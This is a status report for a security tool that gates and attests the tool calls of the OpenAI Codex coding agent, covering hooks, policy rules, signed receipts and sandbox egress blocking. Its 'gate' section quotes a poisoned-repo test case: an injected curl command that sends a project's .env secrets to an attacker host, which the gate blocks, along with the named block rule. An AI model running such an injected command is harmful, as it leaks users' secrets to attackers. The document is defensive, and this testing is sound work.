# IAGA Sentinel × OpenAI Codex — integration status

Honest snapshot as of **2026-06-13**, against **codex-cli 0.138.0-alpha.7**.

Brand rule that governs everything below: **`is_authoritative` stays `false`** on
every OSS receipt (no Sentinel kernel ships in the community build). Where the
real enforcer is Codex's sandbox or its agent loop — not Sentinel — we say so.
Sentinel's job is the signed, tamper-evident **evidence**, plus the cooperative
gate.

All of this is **local / untracked** (no commits). Workspace tests: **390/390**
green; `cargo fmt` clean.

---

## What works (verified live, not on paper)

- **A — gate** (`iaga-codex hook`). PreToolUse event on stdin → `POST /v1/inspect`
  → exit `0` allow / `2` block, **fail-closed** by default. Verified live: a
  benign `cat README.md` → allow (exit 0); the injected
  `curl -d @.env http://…evil…` → block (exit 2) with the specific reason
  `apl[block_secret_exfil_via_egress]`. Hook field names confirmed against the
  real 0.138 binary (`hook_event_name`).

- **B — compiler** (`iaga-codex export-rules`). APL bundle → native Codex
  `execpolicy` `.rules`; syntax confirmed against the real binary. The
  poisoned-repo `egress.apl` compiles honestly to **0 static / 2 runtime-only**
  (the block depends on arguments, not a command prefix).

- **C — ingest** (`iaga-codex ingest`). `codex exec --json` stream → one receipt
  per actionable item, **advisory** tier (recorded, never applied). Verified
  live: `ingest --from <exfil stream>` → `ATTESTED … block` → `iaga replay
  --export` → `iaga-verify` = **CHAIN OK**, receipt records the egress reason and
  `is_authoritative: false`. Parser validated against a real 0.138 capture.

- **Phase 2 — OS-sandbox egress (non-bypassable by the model).** Run Codex under
  its native sandbox (`codex sandbox`, Windows restricted token), which **denies
  outbound network by default**. Verified live: `curl http://example.com` → `200`
  outside; under `codex sandbox -- curl …` → refused **via `127.0.0.1` before DNS**
  (exit 7) — the sandbox, not a DNS failure, stops it. The model literally cannot
  open the socket even if every cooperative check were removed. Enforcer = Codex's
  sandbox; Sentinel attests; `is_authoritative` stays `false`. Runbook in
  [`poisoned-repo/DEMO.md`](poisoned-repo/DEMO.md). Bonus: this box's default
  Codex posture is already `restricted fs + restricted network`, so the
  protection holds in normal interactive runs too.

---

## Roadmap (what's missing, by priority)

1. **Hook literal-payload capture (interactive TUI).** Field names are confirmed,
   but the *literal* PreToolUse payload was never captured: `codex exec` does not
   fire hooks, and a managed-hooks dir set in the user `config.toml` did not load
   on 0.138 (see #2). Low risk — all Codex field knowledge is isolated to
   `crates/iaga-sentinel-codex/src/codex_event.rs` + its fixtures.

2. **Option 3 — non-disableable managed hook.** The real mechanism (from the
   binary) is an admin/MDM-delivered **`requirements.toml`** with
   `allow_managed_hooks_only = true` (+ `allowed_sandbox_modes` without
   `danger-full-access` to also lock Phase 2's sandbox). Live finding 2026-06-13:
   `[hooks] windows_managed_dir` in the **user** config layer parses but does not
   register the hook (`/hooks` → 0 installed); the managed dir is honored only
   from the managed/requirements layer, which can't be proven on a single dev
   box. Deferred; do not ship a "cannot be disabled" claim until a real MDM
   negative test demonstrates it.

3. **`review` → human-in-the-loop "ask".** Codex supports
   `hookSpecificOutput.permissionDecision = ask`; the gate currently maps
   `review → conservative block`. Wire the real ask when needed.

4. **Option 2 — Sentinel egress proxy.** Sandbox network only via `proxy_url` → a
   Sentinel proxy that enforces the `allowed_domains` allowlist and mints a
   receipt per connection. This is the path to honestly attesting a
   *Sentinel*-enforced (not just OS-enforced) network block. Feasible with zero
   core changes by reusing `/v1/inspect`; ~500 lines + HTTPS `CONNECT`. Codex's
   `network_proxy` feature is currently `experimental = false`.

5. **CI round-trip** for `codex execpolicy check` (gated on the Codex binary,
   patterned on the opt-in postgres/E2E jobs). An `#[ignore]`d test already
   shells out to it.

6. **PR5 — signed `enforcement` field in `ReceiptBody`.** Deferred to the
   ReceiptV2 `enforcement_evidence` field (2.0). The value already flows through
   request `metadata` today, so no schema change is needed before then.

7. **Provisional stream shapes** (`mcp_tool_call`, `web_search`) and
   PostToolUse/SessionStart/Stop handling + the rollout-file parser remain out of
   scope / uncaptured.

---

See [`../../../docs/adr/0022-codex-integration.md`](../../../docs/adr/0022-codex-integration.md)
for the full design and spike record.
